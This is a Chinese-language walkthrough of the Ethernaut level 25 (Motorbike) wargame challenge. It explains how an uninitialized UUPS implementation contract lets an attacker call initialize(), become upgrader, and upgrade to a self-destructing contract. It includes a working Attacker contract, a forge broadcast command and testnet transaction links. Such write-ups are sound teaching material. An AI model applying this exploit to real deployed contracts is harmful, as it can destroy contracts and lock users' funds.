# Level 25

[The Ethernaut level 25](https://ethernaut.openzeppelin.com/level/25)

这一关的目的是对实现 `Engine` 合约调用 `selfdestruct()`，使 `Engine` 合约无法使用。

仔细阅读合约，这是一个使用 `UUPS` 的模式的代理合约。`Motorbike` 是代理合约，而 `Engine` 是实现合约。

`Engine` 合约代码中没有定义 `selfdestruct()`。那么将如何调用它呢？可以尝试升级实现合约，使其指向自己部署的攻击者合约。

为了升级逻辑，我们需要确保我们是 `upgrader`。

这里需要注意的是，在这个实现中，`initialize()` 函数应该由代理合约调用。但它是通过 `delegatecall()` 来实现的。这意味着是在代理合约的上下文中进行的，而不是在实现中。

在实现合约的上下文中，这尚未被调用。因此，如果直接调用这个函数，调用者（攻击合约）将成为升级者。

一旦我们成为了upgrader，我们可以直接调用 `upgradeToAndCall()`，并把实现合约更改为自己部署的带有 `selfdestruct` 的攻击合约

攻击者合约：
```
contract Attacker {
    Motorbike motorbike;
    Engine engine;
    Destructive destructive;

    constructor(address motorbikeAddr, address engineAddr) public {
        motorbike = Motorbike(payable(motorbikeAddr));
        engine = Engine(engineAddr);
        destructive = new Destructive();
    }

    function attack() external {
        engine.initialize();
        bytes memory encodedData = abi.encodeWithSignature("killed()");
        engine.upgradeToAndCall(address(destructive), encodedData);
    }
}
```

执行脚本：
```
forge script script/Level25.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

完整代码见：[这里](../../ethernaut/script/Level25.s.sol)


链上记录：
- [level(`Motorbike`)](https://sepolia.etherscan.io/address/0x082198127b7d7adf8D3f035599F15D78C1C0f665)
- [Attacker](https://sepolia.etherscan.io/address/0x20f8B2087Ba547c69c78B02A9251bFc543FdA9fe)
- [attack 交易](https://sepolia.etherscan.io/tx/0x262064fcd168e0afc9fb60166a271747ffc37204f38b103140564dba72a1e419)
- [新 Engine 合约（带自毁功能）](https://sepolia.etherscan.io/address/0x04611f42fbab6cd8028a498e9c825e00bd556dd0)